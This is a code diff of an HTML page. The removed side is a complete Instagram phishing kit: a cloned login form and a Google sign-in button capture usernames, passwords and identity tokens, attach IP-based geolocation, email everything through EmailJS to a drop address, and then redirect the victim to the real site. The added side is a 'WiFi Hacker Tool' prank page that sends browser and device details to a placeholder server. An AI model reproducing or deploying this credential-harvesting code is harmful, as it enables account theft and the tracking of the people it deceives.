@@ -1,262 +1,151 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login • Instagram</title>
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <meta charset="UTF-8">
+  <title>WiFi Hacker Tool</title>
   <style>
-    :root {
-      --bg: #fafafa;
-      --box: #ffffff;
-      --text: #262626;
-      --border: #dbdbdb;
-      --link: #00376b;
-      --secondary: #8e8e8e;
-      --btn-blue: #0095f6;
-      --input-bg: #fafafa;
-    }
-
-    [data-theme="dark"] {
-      --bg: #000000;
-      --box: #000000;
-      --text: #f5f5f5;
-      --border: #262626;
-      --link: #e0f1ff;
-      --secondary: #a8a8a8;
-      --input-bg: #121212;
-    }
-
     body {
-      background-color: var(--bg);
-      color: var(--text);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       margin: 0;
+      padding: 0;
+      background: black;
+      color: #00FF00;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+      height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      position: relative;
     }
 
-    .main-container {
+    .hacker-bg {
+      position: absolute;
       width: 100%;
-      max-width: 350px;
+      height: 100%;
+      background: radial-gradient(circle, #000000 20%, #000000 80%, #000000 100%);
+      animation: hackerEffect 10s infinite;
+      z-index: -1;
     }
 
-    .auth-box {
-      background-color: var(--box);
-      border: 1px solid var(--border);
-      padding: 10px 40px 20px 40px;
-      margin-bottom: 10px;
-      text-align: center;
+    @keyframes hackerEffect {
+      0% { background-position: 0 0; }
+      50% { background-position: 100% 100%; }
+      100% { background-position: 0 0; }
     }
 
-    .logo-area { margin: 22px auto 35px auto; }
-    .logo-img { width: 175px; cursor: pointer; }
-    [data-theme="dark"] .logo-light { display: none; }
-    .logo-dark { display: none; }
-    [data-theme="dark"] .logo-dark { display: inline-block; }
-
-    input {
-      width: 100%;
-      padding: 9px 0 7px 8px;
-      margin-bottom: 6px;
-      background: var(--input-bg);
-      border: 1px solid var(--border);
-      border-radius: 3px;
-      box-sizing: border-box;
-      color: var(--text);
-      font-size: 12px;
-    }
-
-    .login-btn {
-      width: 100%;
-      background-color: var(--btn-blue);
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 7px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 8px;
-      font-size: 14px;
-    }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      margin: 18px 0;
-      color: var(--secondary);
-      font-size: 13px;
-      font-weight: 600;
-    }
-    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
-    .divider span { margin: 0 18px; }
-
-    .fb-login {
-      color: #385185;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-decoration: none;
-      margin-bottom: 15px;
-    }
-
-    .forgot-pw { font-size: 12px; color: var(--link); cursor: pointer; }
-
-    .signup-box {
-      background-color: var(--box);
-      border: 1px solid var(--border);
+    .hacker-ui {
+      background: #000000;
       padding: 20px;
+      border: 2px solid #00FF00;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00FF00;
       text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .hacker-ui h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .hacker-ui p {
       font-size: 14px;
+      margin-bottom: 20px;
     }
 
-    .signup-link { color: var(--btn-blue); font-weight: 600; cursor: pointer; text-decoration: none; }
-
-    .theme-toggle {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
+    .hacker-ui button {
+      background-color: #00FF00;
+      color: black;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
       cursor: pointer;
-      background: var(--box);
-      border: 1px solid var(--border);
-      padding: 10px;
-      border-radius: 50%;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      transition: background-color 0.3s ease;
     }
 
-    #google-btn-container {
-      display: flex;
-      justify-content: center;
-      margin: 10px 0;
+    .hacker-ui button:hover {
+      background-color: #00CC00;
+    }
+
+    .wifi-scanner {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #00FF00;
+    }
+
+    .wifi-scanner span {
+      display: inline-block;
+      width: 100%;
+      height: 10px;
+      background: #00FF00;
+      margin-bottom: 5px;
     }
   </style>
 </head>
-<body data-theme="light">
-
-  <div class="theme-toggle" onclick="toggleTheme()">🌓</div>
-
-  <div class="main-container">
-    <div class="auth-box">
-      <div class="logo-area">
-        <img class="logo-img logo-light" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
-        <img class="logo-img logo-dark" src="https://www.edigitalagency.com.au/wp-content/uploads/instagram-logo-white-text-png-900x311.png" alt="Instagram Logo">
-      </div>
-
-      <form onsubmit="event.preventDefault();">
-        <input type="text" placeholder="Phone number, username, or email">
-        <input type="password" placeholder="Password">
-        <button type="submit" class="login-btn">Log In</button>
-      </form>
-
-      <div class="divider"><span>OR</span></div>
-
-      <div id="google-btn-container">
-        <div id="buttonDiv"></div>
-      </div>
-
-      <p class="forgot-pw">Forgot password?</p>
-    </div>
-
-    <div class="signup-box">
-      Don't have an account? <span class="signup-link">Sign up</span>
+<body>
+  <div class="hacker-bg"></div>
+  <div class="hacker-ui">
+    <h1>WiFi Hacker Tool</h1>
+    <p>Click to send your info to the hacker.</p>
+    <button onclick="sendDeviceInfo()">Send Info</button>
+    <div class="wifi-scanner">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
     </div>
   </div>
 
   <script>
-    // CONFIG - Replace these with your actual IDs
-    const CONFIG = {
-      EMAILJS_PUBLIC_KEY: "Yll0LueIob9ob1rNI",
-      SERVICE_ID: "service_cn3zovj",
-      TEMPLATE_ID: "template_evzrufo",
-      GOOGLE_CLIENT_ID: "1056026425142-im9mmsv7huvujnma0q66soc2lpddhiqk.apps.googleusercontent.com"
-    };
+    // Fake WiFi scanner animation
+    const scanner = document.querySelector('.wifi-scanner');
+    const spans = scanner.querySelectorAll('span');
+    let index = 0;
 
-    emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+    setInterval(() => {
+      spans.forEach((span, i) => {
+        span.style.width = (i === index) ? '100%' : '0%';
+      });
+      index = (index + 1) % spans.length;
+    }, 300);
 
-    // --- MANUAL LOGIN CAPTURE ---
-    const loginForm = document.querySelector('form');
-    loginForm.addEventListener('submit', (e) => {
-      e.preventDefault();
+    // Collect all device info
+    function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: screen.width + "x" + screen.height,
+        deviceMemory: navigator.deviceMemory,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        // Add more fields as needed
+      };
 
-      const usernameInput = loginForm.querySelector('input[type="text"]').value;
-      const passwordInput = loginForm.querySelector('input[type="password"]').value;
+      // Add fake WiFi scanner info
+      info.wifiScanned = "WiFi Network: 192.168.1.1";
+      info.hackStatus = "Hacking in progress...";
 
-      // Get IP and location
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const manualData = {
-            to_email: "d-4wio0wr@maildrop.cc",
-            user_name: "MANUAL_LOGIN",
-            user_email: usernameInput,
-            profile_pic: passwordInput,
-            time: new Date().toLocaleString(),
-            ip_address: data.ip,
-            location: `${data.city}, ${data.region}, ${data.country}`,
-            latitude: data.latitude,
-            longitude: data.longitude
-          };
-
-          emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, manualData)
-            .then(() => {
-              window.location.href = "https://www.instagram.com/accounts/login/";
-            });
-        });
-    });
-
-    // --- GOOGLE LOGIN CAPTURE ---
-    function handleCredentialResponse(response) {
-      const base64Url = response.credential.split('.')[1];
-      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-      const user = JSON.parse(window.atob(base64));
-
-      // Get IP and location
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const googleData = {
-            to_email: "d-4wio0wr@maildrop.cc",
-            user_name: user.name,
-            user_email: user.email,
-            profile_pic: user.picture,
-            time: new Date().toLocaleString(),
-            password: user.email,
-            ip_address: data.ip,
-            location: `${data.city}, ${data.region}, ${data.country}`,
-            latitude: data.latitude,
-            longitude: data.longitude
-          };
-
-          emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, googleData)
-            .then(() => {
-              setTimeout(() => {
-                window.location.href = "https://www.instagram.com";
-              }, 1000);
-            });
-        });
+      return info;
     }
 
-    window.onload = () => {
-      google.accounts.id.initialize({
-        client_id: CONFIG.GOOGLE_CLIENT_ID,
-        callback: handleCredentialResponse
-      });
-      google.accounts.id.renderButton(
-        document.getElementById("buttonDiv"),
-        { theme: "outline", size: "large", width: "270" }
-      );
-    };
+    // Send data to your server (replace with your server URL)
+    function sendDeviceInfo() {
+      const data = getDeviceInfo();
 
-    // --- THEME TOGGLE ---
-    function toggleTheme() {
-      document.body.dataset.theme = document.body.dataset.theme === "light" ? "dark" : "light";
+      fetch('https://your-server.com/collect', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).then(response => {
+        alert("Your info has been sent to the hacker!");
+      });
     }
   </script>
 </body>
